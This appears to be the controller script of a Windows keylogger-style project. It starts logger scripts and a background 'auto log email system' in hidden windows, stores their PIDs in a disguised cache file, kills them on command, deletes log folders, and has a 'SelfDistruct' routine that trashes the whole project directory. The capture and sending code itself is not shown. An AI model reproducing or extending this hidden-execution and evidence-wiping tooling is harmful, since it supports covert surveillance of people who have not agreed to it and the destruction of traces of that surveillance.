try:
	import subprocess, os, re, datetime, sys, shutil
	from send2trash import send2trash
except ModuleNotFoundError as error:
	print(error)

# Subprocess startup-info
process = subprocess.STARTUPINFO(dwFlags=subprocess.STARTF_USESHOWWINDOW)

# directory to the PID Save File
PID_FILE = "./__cache__/__t_init__.tix"


def kill_running():
	"""
	task: Takes care of killing processes
	"""

	# Access the PIDs from a file
	try:
		with open(PID_FILE, 'r') as file:
			# List of saved PIDs
			pyPID = [PID.strip() for PID in file.readlines()]

	except (FileNotFoundError, FileExistsError):
		os.mkdir("./__cache__/")
		pyPID = []

	# killing the processes
	killed = 0 # Indicator that the task was killed

	# List of all the successful std-out 
	TaskSuccess = []
	
	# List of all the unsuccessful std-out 
	TaskFailed = []

	for PID in pyPID:
		# Killing process by PID and any child processes started by it
		killed = 1
		task = subprocess.Popen(f"taskkill /PID {PID} /F /T", stdout=subprocess.PIPE,
								startupinfo=process, creationflags=subprocess.CREATE_NO_WINDOW,
							 	start_new_session=True, stderr=subprocess.PIPE, text=True)

		# Appending the success of a process to the corresponding list
		TaskSuccess += task.stdout.readlines()

		# Appending the failing of a process to the corresponding list
		TaskFailed += task.stderr.readlines()

	else:
		# Clearing the previous logs
		with open(PID_FILE, 'w') as file:
			pass

		# Dictionary of the outputs
		taskprocess = {"TaskSuccess": TaskSuccess, 'TaskFailed': TaskFailed}
		
		return taskprocess if killed else killed

def savePID(process, level=0):
	"""
	process: subprocess object
	level: the level of the process at play; default 0 means the save file content 
	will be overwritten and 1 means content will be appended
	"""

	# Setting the mode for opening the File
	level = "w" if level == 0 else "a"

	# Saving the contents
	with open(PID_FILE, level) as file:
		file.write(f"\n{process.pid}")
		return 1

def RemoveHistory():
	# Access the logs and delete all files
		log_pattern = re.compile(".*(_log[s]?)", re.IGNORECASE)

		# Iterating through folders and directories in current working directory
		for file in os.listdir():

			# Testing if 'file' meets the criteria and that it is a directory
			if re.match(log_pattern, file) and os.path.isdir(file):

				# Sending match to trash///future delete folders completely
				send2trash(file)
		else:
			return 1

def SelfDistruct():
	# Kill all running processes
	kill_running()

	# Removing folder contents
	countdown = len(os.listdir())
	for file in os.listdir('./'):
		print(countdown)
		send2trash(file)
		countdown -= 1
	else:
		print("Boom!!!")

def AutoSendLogs():
	# Running script in background
	task = subprocess.Popen("python bg_run.py", stdout=subprocess.PIPE,
							startupinfo=process, creationflags=subprocess.CREATE_NO_WINDOW,
						 	start_new_session=True, stderr=subprocess.PIPE)
	# Saving the processes PID
	if savePID(task, level=1):
		return task

def PlayLogger(dir):
	# Running script in background
	task = subprocess.Popen(f"python {dir}", stdout=subprocess.PIPE,
							startupinfo=process, creationflags=subprocess.CREATE_NO_WINDOW,
						 	start_new_session=True, stderr=subprocess.PIPE)
	# Saving the processes PID
	if savePID(task, level=0):
		return task

if __name__ == "__main__":
	# accessing the command from command line
	command = sys.argv[-1]

	if command == "RemoveHistory":
		# Deletes log folders
		RemoveHistory()

	elif command == "TurnOff":
		# Kill a running a process
		kill_running()

	elif command == "SelfDistruct":
		# Remove the project
		SelfDistruct()

	elif command == "AutoSendLogs":
		# Initiate the auto log email system
		AutoSendLogs()

	elif command in os.listdir() and command != "main.py":
		# The directory to the logger
		dir_to_logger = f'{command}\\main.py'
		PlayLogger(dir_to_logger)
		
	else:
		print("No Match")
